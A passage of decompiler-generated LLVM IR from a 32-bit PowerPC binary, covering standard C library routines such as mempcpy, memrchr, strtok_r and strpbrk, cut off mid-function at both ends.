  store i32 %v1_10021d94, i32* @r11, align 4
  %v2_10021d98 = xor i32 %v1_10021d94, %v2_10021d8c
  %v2_10021d9c = and i32 %v2_10021d98, -2130640640
  %v6_10021d9c = icmp eq i32 %v2_10021d9c, -2130640640
  br i1 %v6_10021d9c, label %dec_label_pc_10021e00.backedge, label %dec_label_pc_10021da8

dec_label_pc_10021e00.backedge:                   ; preds = %dec_label_pc_10021d7c, %dec_label_pc_10021dec
  %v1_10021e00 = add i32 %v0_10021e00, -1
  store i32 %v1_10021e00, i32* %ctr.global-to-local, align 4
  %v2_10021e00 = icmp eq i32 %v1_10021e00, 0
  br i1 %v2_10021e00, label %dec_label_pc_10021e04, label %dec_label_pc_10021d7c

dec_label_pc_10021da8:                            ; preds = %dec_label_pc_10021d7c
  %v2_10021da8 = inttoptr i32 %v0_10021dbc to i8*
  %v3_10021da8 = load i8, i8* %v2_10021da8, align 1
  %v4_10021da8 = zext i8 %v3_10021da8 to i32
  %v1_10021dac = add i32 %v0_10021dbc, 3
  store i32 %v1_10021dac, i32* @r8, align 4
  %v1_10021db0 = add i32 %v0_10021dbc, 2
  store i32 %v1_10021db0, i32* @r11, align 4
  %v4_10021db4 = icmp eq i32 %v4_10021da8, %v0_10021d54
  br i1 %v4_10021db4, label %dec_label_pc_10021dbc, label %dec_label_pc_10021dc4

dec_label_pc_10021dbc:                            ; preds = %dec_label_pc_10021da8
  ret i32 %v0_10021dbc

dec_label_pc_10021dc4:                            ; preds = %dec_label_pc_10021da8
  %v2_10021dc4 = inttoptr i32 %v1_10021d88 to i8*
  %v3_10021dc4 = load i8, i8* %v2_10021dc4, align 1
  %v4_10021dc4 = zext i8 %v3_10021dc4 to i32
  %v4_10021dc8 = icmp eq i32 %v4_10021dc4, %v0_10021d54
  br i1 %v4_10021dc8, label %dec_label_pc_10021dd0, label %dec_label_pc_10021dd8

dec_label_pc_10021dd0:                            ; preds = %dec_label_pc_10021dc4
  ret i32 %v1_10021d88

dec_label_pc_10021dd8:                            ; preds = %dec_label_pc_10021dc4
  %v2_10021dd8 = inttoptr i32 %v1_10021db0 to i8*
  %v3_10021dd8 = load i8, i8* %v2_10021dd8, align 1
  %v4_10021dd8 = zext i8 %v3_10021dd8 to i32
  %v4_10021ddc = icmp eq i32 %v4_10021dd8, %v0_10021d54
  br i1 %v4_10021ddc, label %dec_label_pc_10021de4, label %dec_label_pc_10021dec

dec_label_pc_10021de4:                            ; preds = %dec_label_pc_10021dd8
  ret i32 %v1_10021db0

dec_label_pc_10021dec:                            ; preds = %dec_label_pc_10021dd8
  %v2_10021dec = inttoptr i32 %v1_10021dac to i8*
  %v3_10021dec = load i8, i8* %v2_10021dec, align 1
  %v4_10021dec = zext i8 %v3_10021dec to i32
  %v4_10021df0 = icmp eq i32 %v4_10021dec, %v0_10021d54
  br i1 %v4_10021df0, label %dec_label_pc_10021df8, label %dec_label_pc_10021e00.backedge

dec_label_pc_10021df8:                            ; preds = %dec_label_pc_10021dec
  ret i32 %v1_10021dac

dec_label_pc_10021e04:                            ; preds = %dec_label_pc_10021e00.backedge, %dec_label_pc_10021d54
  %v0_10021e1026 = phi i32 [ %v0_10021d7c16, %dec_label_pc_10021d54 ], [ %v1_10021d80, %dec_label_pc_10021e00.backedge ]
  %v0_10021e04 = phi i32 [ %v0_10021d58, %dec_label_pc_10021d54 ], [ %v1_10021d84, %dec_label_pc_10021e00.backedge ]
  %v1_10021e04 = add i32 %v0_10021e04, 1
  store i32 %v1_10021e04, i32* %r5.global-to-local, align 4
  store i32 %v0_10021e04, i32* %ctr.global-to-local, align 4
  %v2_10021e203 = icmp eq i32 %v0_10021e04, 0
  br i1 %v2_10021e203, label %dec_label_pc_10021e24, label %dec_label_pc_10021e10

dec_label_pc_10021e10:                            ; preds = %dec_label_pc_10021e04, %dec_label_pc_10021e10.dec_label_pc_10021e10_crit_edge
  %v1_10021e14 = phi i32 [ %v1_10021e14.pre, %dec_label_pc_10021e10.dec_label_pc_10021e10_crit_edge ], [ %v0_10021d54, %dec_label_pc_10021e04 ]
  %v0_10021e10 = phi i32 [ %v1_10021e1c, %dec_label_pc_10021e10.dec_label_pc_10021e10_crit_edge ], [ %v0_10021e1026, %dec_label_pc_10021e04 ]
  %v1_10021e10 = inttoptr i32 %v0_10021e10 to i8*
  %v2_10021e10 = load i8, i8* %v1_10021e10, align 1
  %v3_10021e10 = zext i8 %v2_10021e10 to i32
  %v4_10021e14 = icmp eq i32 %v3_10021e10, %v1_10021e14
  %v0_10021e18 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021e14, i32 %v0_10021e18)
  %v0_10021e1c = load i32, i32* @r3, align 4
  %v1_10021e1c = add i32 %v0_10021e1c, 1
  store i32 %v1_10021e1c, i32* @r3, align 4
  %v0_10021e20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021e20 = add i32 %v0_10021e20, -1
  store i32 %v1_10021e20, i32* %ctr.global-to-local, align 4
  %v2_10021e20 = icmp eq i32 %v1_10021e20, 0
  br i1 %v2_10021e20, label %dec_label_pc_10021e24, label %dec_label_pc_10021e10.dec_label_pc_10021e10_crit_edge

dec_label_pc_10021e10.dec_label_pc_10021e10_crit_edge: ; preds = %dec_label_pc_10021e10
  %v1_10021e14.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10021e10

dec_label_pc_10021e24:                            ; preds = %dec_label_pc_10021e10, %dec_label_pc_10021e04
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10021e20, { 1, 0 }
  uselistorder i32 %v1_10021e1c, { 1, 0 }
  uselistorder i32 %v0_10021e04, { 1, 2, 0 }
  uselistorder i32 %v1_10021e00, { 2, 1, 0 }
  uselistorder i32 %v1_10021d84, { 0, 2, 1 }
  uselistorder i32 %v1_10021d80, { 0, 2, 1 }
  uselistorder i32 %v0_10021dbc, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v2_10021d5c, { 1, 0 }
  uselistorder i32 %v1_10021d58, { 2, 1, 0 }
  uselistorder i32 %v0_10021d7c16, { 1, 0 }
  uselistorder i32 %v0_10021d54, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 %v0_10021d58, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10021d4c, { 1, 0 }
  uselistorder i32 %v1_10021d44, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10021d487, { 2, 0, 1 }
  uselistorder i32 %v1_10021d28, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 5, 2, 7, 6, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10021e10, { 1, 0 }
  uselistorder label %dec_label_pc_10021e00.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10021d7c, { 1, 0 }
  uselistorder label %dec_label_pc_10021d50, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268574280, i32* @lr, align 4
  %v0_10021e44 = call i32 @memcpy()
  %v0_10021e4c = load i32, i32* @r28, align 4
  %v1_10021e4c = load i32, i32* @r29, align 4
  %v2_10021e4c = add i32 %v1_10021e4c, %v0_10021e4c
  ret i32 %v2_10021e4c
}

define i32 @memrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_10021e64 = urem i32 %arg2, 256
  store i32 %v1_10021e64, i32* %r4.global-to-local, align 4
  %v2_10021e6c = add i32 %arg3, %arg1
  store i32 %v2_10021e6c, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %ctr.global-to-local, align 4
  %v2_10021e8813 = icmp eq i32 %arg3, 0
  br i1 %v2_10021e8813, label %dec_label_pc_10021e90, label %dec_label_pc_10021e8c

dec_label_pc_10021e74:                            ; preds = %dec_label_pc_10021e8c
  %v1_10021e74 = add i32 %v0_10021e74, -1
  %v2_10021e74 = inttoptr i32 %v1_10021e74 to i8*
  %v3_10021e74 = load i8, i8* %v2_10021e74, align 1
  %v4_10021e74 = zext i8 %v3_10021e74 to i32
  store i32 %v1_10021e74, i32* %r3.global-to-local, align 4
  %v0_10021e78 = load i32, i32* %r5.global-to-local, align 4
  %v1_10021e78 = add i32 %v0_10021e78, -1
  store i32 %v1_10021e78, i32* %r5.global-to-local, align 4
  %v1_10021e7c = load i32, i32* %r4.global-to-local, align 4
  %v4_10021e7c = icmp eq i32 %v4_10021e74, %v1_10021e7c
  %v0_10021e80 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021e7c, i32 %v0_10021e80)
  %v0_10021e84 = load i32, i32* %r3.global-to-local, align 4
  %v0_10021e88 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021e88 = add i32 %v0_10021e88, -1
  store i32 %v1_10021e88, i32* %ctr.global-to-local, align 4
  %v2_10021e88 = icmp eq i32 %v1_10021e88, 0
  br i1 %v2_10021e88, label %dec_label_pc_10021e90.loopexit, label %dec_label_pc_10021e8c

dec_label_pc_10021e8c:                            ; preds = %entry, %dec_label_pc_10021e74
  %v0_10021e74 = phi i32 [ %v0_10021e84, %dec_label_pc_10021e74 ], [ %v2_10021e6c, %entry ]
  %v0_10021e8c.in.in = phi i32 [ %v0_10021e84, %dec_label_pc_10021e74 ], [ %v2_10021e6c, %entry ]
  %v0_10021e8c.in = urem i32 %v0_10021e8c.in.in, 4
  %v0_10021e8c = icmp eq i32 %v0_10021e8c.in, 0
  br i1 %v0_10021e8c, label %dec_label_pc_10021e90.loopexit, label %dec_label_pc_10021e74

dec_label_pc_10021e90.loopexit:                   ; preds = %dec_label_pc_10021e8c, %dec_label_pc_10021e74
  %v0_10021eb816.ph = phi i32 [ %v0_10021e84, %dec_label_pc_10021e74 ], [ %v0_10021e74, %dec_label_pc_10021e8c ]
  %v0_10021e90.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_10021e94.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021e90

dec_label_pc_10021e90:                            ; preds = %dec_label_pc_10021e90.loopexit, %entry
  %v0_10021e94 = phi i32 [ 0, %entry ], [ %v0_10021e94.pre, %dec_label_pc_10021e90.loopexit ]
  %v0_10021e90 = phi i32 [ %v1_10021e64, %entry ], [ %v0_10021e90.pre, %dec_label_pc_10021e90.loopexit ]
  %v0_10021eb816 = phi i32 [ %v2_10021e6c, %entry ], [ %v0_10021eb816.ph, %dec_label_pc_10021e90.loopexit ]
  %v1_10021e90 = mul i32 %v0_10021e90, 256
  %v1_10021e94 = udiv i32 %v0_10021e94, 4
  %v2_10021e98 = or i32 %v1_10021e90, %v0_10021e90
  %v1_10021e9c = add nuw nsw i32 %v1_10021e94, 1
  store i32 %v1_10021e9c, i32* @r11, align 4
  %v1_10021ea0 = mul i32 %v2_10021e98, 65536
  %v2_10021eac = or i32 %v1_10021ea0, %v2_10021e98
  store i32 %v2_10021eac, i32* %r7.global-to-local, align 4
  store i32 -2130640640, i32* @r8, align 4
  store i32 %v1_10021e94, i32* %ctr.global-to-local, align 4
  %tmp = icmp ult i32 %v0_10021e94, 4
  br i1 %tmp, label %dec_label_pc_10021f30, label %dec_label_pc_10021eb8

dec_label_pc_10021eb8:                            ; preds = %dec_label_pc_10021e90, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge
  %v0_10021f2c21 = phi i32 [ %v1_10021f2c, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge ], [ %v1_10021e94, %dec_label_pc_10021e90 ]
  %v0_10021ed8 = phi i32 [ %v0_10021ed8.pre, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge ], [ -2130640640, %dec_label_pc_10021e90 ]
  %v0_10021ec0 = phi i32 [ %v0_10021ec0.pre, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge ], [ %v2_10021eac, %dec_label_pc_10021e90 ]
  %v0_10021ebc = phi i32 [ %v0_10021ebc.pre, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge ], [ %v0_10021e94, %dec_label_pc_10021e90 ]
  %v0_10021eb8 = phi i32 [ %v0_10021eb8.pre, %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge ], [ %v0_10021eb816, %dec_label_pc_10021e90 ]
  %v1_10021eb8 = add i32 %v0_10021eb8, -4
  %v2_10021eb8 = inttoptr i32 %v1_10021eb8 to i32*
  %v3_10021eb8 = load i32, i32* %v2_10021eb8, align 4
  store i32 %v1_10021eb8, i32* %r3.global-to-local, align 4
  %v1_10021ebc = add i32 %v0_10021ebc, -4
  store i32 %v1_10021ebc, i32* %r5.global-to-local, align 4
  %v2_10021ec0 = xor i32 %v3_10021eb8, %v0_10021ec0
  %v1_10021ec4 = add i32 %v0_10021eb8, -3
  store i32 %v1_10021ec4, i32* @r10, align 4
  %v1_10021ecc = add i32 %v2_10021ec0, 2130640639
  %v1_10021ed4 = add i32 %v0_10021eb8, -2
  store i32 %v1_10021ed4, i32* @r11, align 4
  %v2_10021ed0 = sub i32 -1, %v2_10021ec0
  %v2_10021ed8 = xor i32 %v1_10021ecc, %v2_10021ed0
  %v3_10021ed8 = and i32 %v2_10021ed8, %v0_10021ed8
  %v6_10021ed8 = icmp eq i32 %v3_10021ed8, 0
  %v1_10021edc = add i32 %v0_10021eb8, -1
  br i1 %v6_10021ed8, label %dec_label_pc_10021f2c.backedge, label %dec_label_pc_10021ee4

dec_label_pc_10021ee4:                            ; preds = %dec_label_pc_10021eb8
  %v2_10021ee4 = inttoptr i32 %v1_10021edc to i8*
  %v3_10021ee4 = load i8, i8* %v2_10021ee4, align 1
  %v4_10021ee4 = zext i8 %v3_10021ee4 to i32
  %v1_10021ee8 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021ee8 = icmp eq i32 %v4_10021ee4, %v1_10021ee8
  br i1 %v4_10021ee8, label %dec_label_pc_10021ef0, label %dec_label_pc_10021ef8

dec_label_pc_10021ef0:                            ; preds = %dec_label_pc_10021ee4
  store i32 %v1_10021edc, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021edc

dec_label_pc_10021ef8:                            ; preds = %dec_label_pc_10021ee4
  %v2_10021ef8 = inttoptr i32 %v1_10021ed4 to i8*
  %v3_10021ef8 = load i8, i8* %v2_10021ef8, align 1
  %v4_10021ef8 = zext i8 %v3_10021ef8 to i32
  %v4_10021efc = icmp eq i32 %v4_10021ef8, %v1_10021ee8
  br i1 %v4_10021efc, label %dec_label_pc_10021f04, label %dec_label_pc_10021f0c

dec_label_pc_10021f04:                            ; preds = %dec_label_pc_10021ef8
  store i32 %v1_10021ed4, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021ed4

dec_label_pc_10021f0c:                            ; preds = %dec_label_pc_10021ef8
  %v2_10021f0c = inttoptr i32 %v1_10021ec4 to i8*
  %v3_10021f0c = load i8, i8* %v2_10021f0c, align 1
  %v4_10021f0c = zext i8 %v3_10021f0c to i32
  %v4_10021f10 = icmp eq i32 %v4_10021f0c, %v1_10021ee8
  br i1 %v4_10021f10, label %dec_label_pc_10021f18, label %dec_label_pc_10021f20

dec_label_pc_10021f18:                            ; preds = %dec_label_pc_10021f0c
  store i32 %v1_10021ec4, i32* %r3.global-to-local, align 4
  ret i32 %v1_10021ec4

dec_label_pc_10021f20:                            ; preds = %dec_label_pc_10021f0c
  %v1_10021f20 = inttoptr i32 %v1_10021eb8 to i8*
  %v2_10021f20 = load i8, i8* %v1_10021f20, align 1
  %v3_10021f20 = zext i8 %v2_10021f20 to i32
  %v4_10021f24 = icmp eq i32 %v3_10021f20, %v1_10021ee8
  %v0_10021f28 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021f24, i32 %v0_10021f28)
  %v0_10021f2c.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10021f2c.backedge

dec_label_pc_10021f2c.backedge:                   ; preds = %dec_label_pc_10021f20, %dec_label_pc_10021eb8
  %v0_10021f2c = phi i32 [ %v0_10021f2c.pre, %dec_label_pc_10021f20 ], [ %v0_10021f2c21, %dec_label_pc_10021eb8 ]
  %v1_10021f2c = add i32 %v0_10021f2c, -1
  store i32 %v1_10021f2c, i32* %ctr.global-to-local, align 4
  %v2_10021f2c = icmp eq i32 %v1_10021f2c, 0
  br i1 %v2_10021f2c, label %dec_label_pc_10021f2c.dec_label_pc_10021f30_crit_edge, label %dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge

dec_label_pc_10021f2c.backedge.dec_label_pc_10021eb8_crit_edge: ; preds = %dec_label_pc_10021f2c.backedge
  %v0_10021eb8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_10021ebc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10021ec0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_10021ed8.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_10021eb8

dec_label_pc_10021f2c.dec_label_pc_10021f30_crit_edge: ; preds = %dec_label_pc_10021f2c.backedge
  %v0_10021f30.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10021f30

dec_label_pc_10021f30:                            ; preds = %dec_label_pc_10021f2c.dec_label_pc_10021f30_crit_edge, %dec_label_pc_10021e90
  %v0_10021f30 = phi i32 [ %v0_10021f30.pre, %dec_label_pc_10021f2c.dec_label_pc_10021f30_crit_edge ], [ %v0_10021e94, %dec_label_pc_10021e90 ]
  %v1_10021f30 = add i32 %v0_10021f30, 1
  store i32 %v1_10021f30, i32* %r5.global-to-local, align 4
  store i32 %v0_10021f30, i32* %ctr.global-to-local, align 4
  %v2_10021f483 = icmp eq i32 %v0_10021f30, 0
  br i1 %v2_10021f483, label %dec_label_pc_10021f4c, label %dec_label_pc_10021f3c

dec_label_pc_10021f3c:                            ; preds = %dec_label_pc_10021f30, %dec_label_pc_10021f3c
  %v0_10021f3c = load i32, i32* %r3.global-to-local, align 4
  %v1_10021f3c = add i32 %v0_10021f3c, -1
  %v2_10021f3c = inttoptr i32 %v1_10021f3c to i8*
  %v3_10021f3c = load i8, i8* %v2_10021f3c, align 1
  %v4_10021f3c = zext i8 %v3_10021f3c to i32
  store i32 %v1_10021f3c, i32* %r3.global-to-local, align 4
  %v1_10021f40 = load i32, i32* %r4.global-to-local, align 4
  %v4_10021f40 = icmp eq i32 %v4_10021f3c, %v1_10021f40
  %v0_10021f44 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10021f40, i32 %v0_10021f44)
  %v0_10021f48 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10021f48 = add i32 %v0_10021f48, -1
  store i32 %v1_10021f48, i32* %ctr.global-to-local, align 4
  %v2_10021f48 = icmp eq i32 %v1_10021f48, 0
  br i1 %v2_10021f48, label %dec_label_pc_10021f4c, label %dec_label_pc_10021f3c

dec_label_pc_10021f4c:                            ; preds = %dec_label_pc_10021f3c, %dec_label_pc_10021f30
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10021f48, { 1, 0 }
  uselistorder i32 %v0_10021f30, { 1, 2, 0 }
  uselistorder i32 %v1_10021f2c, { 2, 1, 0 }
  uselistorder i32 %v1_10021edc, { 1, 0, 2 }
  uselistorder i32 %v1_10021ed4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_10021ec4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10021e98, { 1, 0 }
  uselistorder i32 %v1_10021e94, { 2, 1, 0 }
  uselistorder i32 %v0_10021e90, { 1, 0 }
  uselistorder i32 %v0_10021e94, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10021e88, { 1, 0 }
  uselistorder i32 %v0_10021e84, { 1, 0, 2 }
  uselistorder i32 %v2_10021e6c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10021e64, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 6, 5, 1, 8, 7, 2 }
  uselistorder i32 -3, { 1, 3, 4, 0, 5, 2, 6 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10021f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10021eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10021e8c, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10021f58 = load i32, i32* @lr, align 4
  store i32 %v0_10021f58, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_10021f60 = icmp eq i32 %arg1, 0
  %v0_10021f68 = load i32, i32* @r5, align 4
  store i32 %v0_10021f68, i32* %r30.global-to-local, align 4
  %v0_10021f6c = load i32, i32* @r4, align 4
  store i32 %v0_10021f6c, i32* %r29.global-to-local, align 4
  br i1 %v3_10021f60, label %dec_label_pc_10021f74, label %dec_label_pc_10021f78

dec_label_pc_10021f74:                            ; preds = %entry
  %v1_10021f74 = inttoptr i32 %v0_10021f68 to i32*
  %v2_10021f74 = load i32, i32* %v1_10021f74, align 4
  store i32 %v2_10021f74, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10021f78

dec_label_pc_10021f78:                            ; preds = %entry, %dec_label_pc_10021f74
  %v0_10021f78 = phi i32 [ %arg1, %entry ], [ %v2_10021f74, %dec_label_pc_10021f74 ]
  store i32 %v0_10021f78, i32* @r3, align 4
  %v1_10021f7c = inttoptr i32 %v0_10021f78 to i8*
  %v2_10021f7c = call i32 @__GI_strspn(i8* %v1_10021f7c)
  %v0_10021f80 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10021f80, i32* @r4, align 4
  %v0_10021f84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10021f84 = add i32 %v0_10021f84, %v2_10021f7c
  %v3_10021f84 = inttoptr i32 %v2_10021f84 to i8*
  %v4_10021f84 = load i8, i8* %v3_10021f84, align 1
  store i32 %v2_10021f84, i32* @r31, align 4
  store i32 %v2_10021f84, i32* @r3, align 4
  %v3_10021f90 = icmp eq i8 %v4_10021f84, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10021f90, label %dec_label_pc_10021f9c, label %dec_label_pc_10021fa4

dec_label_pc_10021f9c:                            ; preds = %dec_label_pc_10021f78
  %v1_10021f9c = load i32, i32* %r30.global-to-local, align 4
  %v2_10021f9c = inttoptr i32 %v1_10021f9c to i32*
  store i32 %v2_10021f84, i32* %v2_10021f9c, align 4
  br label %dec_label_pc_10021fdc

dec_label_pc_10021fa4:                            ; preds = %dec_label_pc_10021f78
  store i32 268574632, i32* @lr, align 4
  %v0_10021fa4 = call i32 @__GI_strpbrk()
  %v4_10021fac = icmp eq i32 %v0_10021fa4, 0
  %v0_10021fb0 = load i32, i32* @r31, align 4
  store i32 %v0_10021fb0, i32* @r3, align 4
  %v2_10021fb4 = add i32 %v0_10021fa4, 1
  store i32 %v2_10021fb4, i32* @r11, align 4
  br i1 %v4_10021fac, label %dec_label_pc_10021fbc, label %dec_label_pc_10021fcc

dec_label_pc_10021fbc:                            ; preds = %dec_label_pc_10021fa4
  store i32 268574656, i32* @lr, align 4
  %v4_10021fbc = call i32 @rawmemchr(i32 %v0_10021fb0, i32 0, i32 0)
  %v0_10021fc0 = load i32, i32* @r31, align 4
  store i32 %v0_10021fc0, i32* %r0.global-to-local, align 4
  %v1_10021fc4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10021fc4 = inttoptr i32 %v1_10021fc4 to i32*
  store i32 %v4_10021fbc, i32* %v2_10021fc4, align 4
  br label %dec_label_pc_10021fdc

dec_label_pc_10021fcc:                            ; preds = %dec_label_pc_10021fa4
  %v1_10021fac = inttoptr i32 %v0_10021fa4 to i8*
  store i8 0, i8* %v1_10021fac, align 1
  %v0_10021fd4 = load i32, i32* @r31, align 4
  store i32 %v0_10021fd4, i32* %r0.global-to-local, align 4
  %v0_10021fd8 = load i32, i32* @r11, align 4
  %v1_10021fd8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10021fd8 = inttoptr i32 %v1_10021fd8 to i32*
  store i32 %v0_10021fd8, i32* %v2_10021fd8, align 4
  br label %dec_label_pc_10021fdc

dec_label_pc_10021fdc:                            ; preds = %dec_label_pc_10021fbc, %dec_label_pc_10021f9c, %dec_label_pc_10021fcc
  %v0_10021fdc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10021f58, i32* %r0.global-to-local, align 4
  ret i32 %v0_10021fdc

; uselistorder directives
  uselistorder i32 %v0_10021fa4, { 2, 0, 1 }
  uselistorder i32 %v2_10021f84, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10021f78, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_10021fdc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10021f78, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_100220141 = load i32, i32* @r3, align 4
  %v1_100220142 = inttoptr i32 %v0_100220141 to i8*
  %v2_100220143 = load i8, i8* %v1_100220142, align 1
  %v3_100220144 = zext i8 %v2_100220143 to i32
  store i32 %v3_100220144, i32* %r11.global-to-local, align 4
  %v3_100220186 = icmp eq i8 %v2_100220143, 0
  br i1 %v3_100220186, label %dec_label_pc_10022028, label %dec_label_pc_10022020

dec_label_pc_10021ff8:                            ; preds = %dec_label_pc_10021ffc
  %v3_10021ffc = zext i8 %v2_10021ffc to i32
  %v4_10022008 = icmp eq i32 %v3_10021ffc, %v1_10022008
  %v0_10021ff8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10022008, i32 %v0_10021ff8)
  %v0_10021ffc.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10022008.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10021ffc

dec_label_pc_10021ffc:                            ; preds = %dec_label_pc_10022020, %dec_label_pc_10021ff8
  %v1_10022008 = phi i32 [ %v1_100220089, %dec_label_pc_10022020 ], [ %v1_10022008.pre, %dec_label_pc_10021ff8 ]
  %v0_10021ffc = phi i32 [ %v0_10022020, %dec_label_pc_10022020 ], [ %v0_10021ffc.pre, %dec_label_pc_10021ff8 ]
  %v1_10021ffc = inttoptr i32 %v0_10021ffc to i8*
  %v2_10021ffc = load i8, i8* %v1_10021ffc, align 1
  %v1_10022000 = add i32 %v0_10021ffc, 1
  store i32 %v1_10022000, i32* %r9.global-to-local, align 4
  %v3_10022004 = icmp eq i8 %v2_10021ffc, 0
  br i1 %v3_10022004, label %dec_label_pc_10022010, label %dec_label_pc_10021ff8

dec_label_pc_10022010:                            ; preds = %dec_label_pc_10021ffc
  %v0_10022010 = load i32, i32* @r3, align 4
  %v1_10022010 = add i32 %v0_10022010, 1
  store i32 %v1_10022010, i32* @r3, align 4
  %v1_10022014 = inttoptr i32 %v1_10022010 to i8*
  %v2_10022014 = load i8, i8* %v1_10022014, align 1
  %v3_10022014 = zext i8 %v2_10022014 to i32
  store i32 %v3_10022014, i32* %r11.global-to-local, align 4
  %v3_10022018 = icmp eq i8 %v2_10022014, 0
  br i1 %v3_10022018, label %dec_label_pc_10022028, label %dec_label_pc_10022020

dec_label_pc_10022020:                            ; preds = %entry, %dec_label_pc_10022010
  %v1_100220089 = phi i32 [ %v3_10022014, %dec_label_pc_10022010 ], [ %v3_100220144, %entry ]
  %v0_10022020 = load i32, i32* @r4, align 4
  store i32 %v0_10022020, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10021ffc

dec_label_pc_10022028:                            ; preds = %dec_label_pc_10022010, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10022020, { 1, 0 }
  uselistorder i32 %v0_10021ffc, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10022020, { 1, 0 }
}

define i32 @__rpc_thread_clnt_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 268574788, i32* @lr, align 4
  %v0_10022040 = call i32 @__rpc_thread_variables()
  %v1_10022044 = add i32 %v0_10022040, 164
  %v2_10022044 = inttoptr i32 %v1_10022044 to i32*
  %v3_10022044 = load i32, i32* %v2_10022044, align 4
  store i32 %v3_10022044, i32* %r31.global-to-local, align 4
  %v3_10022048 = icmp eq i32 %v3_10022044, 0
